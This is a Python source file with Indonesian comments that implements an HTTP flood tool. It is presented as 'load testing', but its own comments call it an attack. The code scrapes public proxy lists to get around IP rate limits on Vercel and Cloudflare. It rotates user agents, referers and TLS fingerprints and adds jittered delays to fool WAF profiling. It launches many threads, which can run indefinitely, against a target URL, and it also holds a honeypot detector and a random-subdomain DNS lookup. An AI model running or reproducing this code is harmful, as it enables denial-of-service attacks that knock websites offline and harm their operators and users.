import socket
import random
import threading
import time
import requests
import secrets
from typing import Dict, List

# * Modul Peralatan Keamanan Lanjutan
class SpecialTools:
    def __init__(self):
        self.isFlooding = False
        self.user_agents: List[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
        ]
        self.referers: List[str] = [
            "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
            "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/",
            "https://t.co/", "https://github.com/", "https://stackoverflow.com/"
        ]
        self.stats: Dict[str, int] = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}

    def detectHoneypot(self, target: str) -> bool:
        """Deteksi HoneyPot melalui pengukuran respons penundaan soket.
        
        Args:
            target: Alamat peladen IP/Domain sasaran.
            
        Returns:
            True jika terindikasi Honeypot berdasarkan respon yang lambat tak wajar.
        """
        start = time.time()
        try:
            socket.create_connection((target, 80), timeout=2)
            delay = time.time() - start
            return delay > 1.5
        except Exception:
            return False

    # * Alias untuk sinkronisasi dengan Core v6.3.1 (Apex "Nitro" Engine)
    def runNitroStress(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
        """Menjalankan pengujian beban Nitro (Pembungkus HTTP Flood).
        
        Args:
            targetUrl: URL lengkap web yang diuji.
            duration: Durasi waktu detik.
            threads: Paralel pekerja utas jaringan.
            
        Returns:
            String konfirmasi inisialisasi uji beban Nitro.
        """
        return self.runHttpFlood(targetUrl, duration, threads)
        
    def runHttpFlood(self, targetUrl: str, duration: int = 15, threads: int = 50) -> str:
        """Menjalankan modul asinkron pengujian beban (HTTP Flood) pada aplikasi web dengan rotasi identitas.
        
        Args:
            targetUrl: URL lengkap web yang diuji.
            duration: Durasi waktu detik. 0 menandakan konstan tidak terbatas.
            threads: Paralel pekerja utas jaringan.
            
        Returns:
            String konfirmasi inisialisasi uji beban respon server.
        """
        if not targetUrl.startswith("http://") and not targetUrl.startswith("https://"):
            targetUrl = f"https://{targetUrl}"
            
        self.isFlooding = True
        self.stats = {"success": 0, "blocked": 0, "error": 0, "redirect": 0}
        
        # Scrape proxy gratis untuk menembus IP-Rate Limit
        proxies_list = []
        try:
            print("[*] Menginisiasi pengumpulan Proxy untuk Bypass Limit IP Vercel/CF...")
            proxy_fetch = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
            if proxy_fetch.status_code == 200:
                raw_px = proxy_fetch.text.split('\n')
                proxies_list = [p.strip() for p in raw_px if p.strip()]
                print(f"[+] Berhasil mengumpulkan {len(proxies_list)} HTTP proxy aktif!")
        except Exception:
            print("[-] Gagal mengambil daftar proxy. Melanjutkan serangan mode Jalur Tunggal (Single-IP).")
        
        print(f"[*] Evaluasi HTTP Flood ke {targetUrl} menggunakan {threads} pekerja.")

        def attack_worker():
            # * Batas waktu tidak terhingga jika nilai dimasukkan 0
            timeout = (time.time() + duration) if duration > 0 else (time.time() + 999999)
            
            try:
                import tls_client
                has_tls_client = True
            except ImportError:
                has_tls_client = False
                session = requests.Session()
                session.verify = False 
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            
            # Profil TLS Client yang tersedia untuk merandom JA3 fingerprint
            tls_profiles = [
                "chrome_120", "chrome_119", "chrome_118", "chrome_117",
                "firefox_120", "firefox_119", "firefox_117",
                "safari_16_0", "safari_15_6_1", "opera_90", "opera_89"
            ]
            
            while time.time() < timeout and self.isFlooding:
                if hasattr(self, 'core') and self.core and getattr(self.core, 'stop_requested', False):
                    break
                    
                try:
                    # Variasi jeda yang nyata untuk membodohi rate limiter dinamis (WAF behavior profiling)
                    time.sleep(random.uniform(0.05, 0.2))
                    
                    if has_tls_client:
                        # Buat session TLS baru tiap request dengan fingerprint yang berbeda-beda
                        client_profile = random.choice(tls_profiles)
                        tls_session = tls_client.Session(
                            client_identifier=client_profile,
                            random_tls_extension_order=True
                        )
                        
                        # Menggunakan Proxy Jika Tersedia
                        proxy_dict = None
                        if proxies_list:
                            rand_px = random.choice(proxies_list)
                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
                            tls_session.proxies = proxy_dict
                            
                        user_agent = random.choice(self.user_agents)
                        is_chrome = "Chrome" in user_agent
                        
                        headers = {
                            'User-Agent': user_agent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
                            'Sec-Fetch-User': '?1',
                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
                        }
                        # Menghapus elemen kosong (contoh Referer kosong)
                        headers = {k: v for k, v in headers.items() if v}
                        
                        resp = tls_session.get(targetUrl, headers=headers, timeout_seconds=6, allow_redirects=True)
                        
                    else:
                        # Fallback ke request biasa jika tls_client tidak terinstall
                        proxy_dict = None
                        if proxies_list:
                            rand_px = random.choice(proxies_list)
                            proxy_dict = {"http": f"http://{rand_px}", "https": f"http://{rand_px}"}
                            
                        user_agent = random.choice(self.user_agents)
                        is_chrome = "Chrome" in user_agent
                        
                        headers = {
                            'User-Agent': user_agent,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' if is_chrome else 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7']),
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': random.choice(['none', 'cross-site']),
                            'Sec-Fetch-User': '?1',
                            'Cache-Control': random.choice(['max-age=0', 'no-cache']),
                            'Referer': random.choice(self.referers) if random.random() > 0.3 else ''
                        }
                        headers = {k: v for k, v in headers.items() if v}
                        
                        resp = session.get(targetUrl, headers=headers, proxies=proxy_dict, timeout=6, allow_redirects=True)
                    
                    
                    code = resp.status_code
                    if code == 200: self.stats["success"] += 1
                    elif code == 403 or code == 429: self.stats["blocked"] += 1
                    elif 300 <= code < 400: self.stats["redirect"] += 1
                    else: self.stats["error"] += 1
                    
                except Exception:
                    self.stats["error"] += 1

        workers = []
        for _ in range(threads):
            t = threading.Thread(target=attack_worker, daemon=True)
            t.start()
            workers.append(t)
            
        return f"Pengujian beban asinkron HTTP Flood dijalankan {duration} detik."

    def stopActiveTasks(self) -> str:
        """Hentikan paksa seluruh lalu lintas uji beban."""
        self.isFlooding = False
        return "Penghentian pengerjaan beban berhasil disebarkan ke pekerja utas."

    def dnsStressTest(self, target: str) -> str:
        """Menjalankan pengujian resolusi DNS acak.
        
        Args:
            target: Sistem pemetaan rute target.
            
        Returns:
            String log sukses / gagal.
        """
        try:
            for i in range(5):
                socket.gethostbyname(f"v-domain-{random.randint(1,999)}.{target}")
            return "Pencarian jejak asinkron rute sub-DNS dirampungkan."
        except Exception as e:
            return f"DNS Error: {str(e)}"
